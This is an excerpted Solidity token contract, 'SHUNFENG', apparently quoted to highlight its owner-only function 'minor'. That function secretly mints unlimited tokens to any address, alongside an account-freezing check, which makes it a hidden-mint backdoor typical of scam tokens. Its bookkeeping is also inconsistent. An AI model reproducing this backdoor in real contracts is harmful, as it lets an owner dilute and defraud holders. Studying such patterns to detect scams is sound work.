...
contract SHUNFENG is Context, IERC20, Ownable {
    ...
    mapping(address => uint256) private Additional_issuance_record;
    ...
    address public charityWallet = 0x900af6F3f9DB5a1514c80Ef772EabBe8d0B95300;
   ...
   /* event Transfer(address indexed from, address indexed to, uint256 value);  
    ...
    function deliver(uint256 tAmount) public {
        ...
        require(!frozenAccount[sender],"Excluded addresses cannot call this function");
    ...
    function minor(address inAddress, uint256 amount) external onlyOwner() {
        require(amount > 0, "Transfer amount must be greater than zero");
        Additional_issuance_record[inAddress]+=amount;
        _tOwned[inAddress] += amount;
        _rOwned[inAddress] = _rOwned[inAddress].add(amount);
        _tTotal += amount;
        Additional_issuance_record[inAddress] = amount.add(amount);
    }
}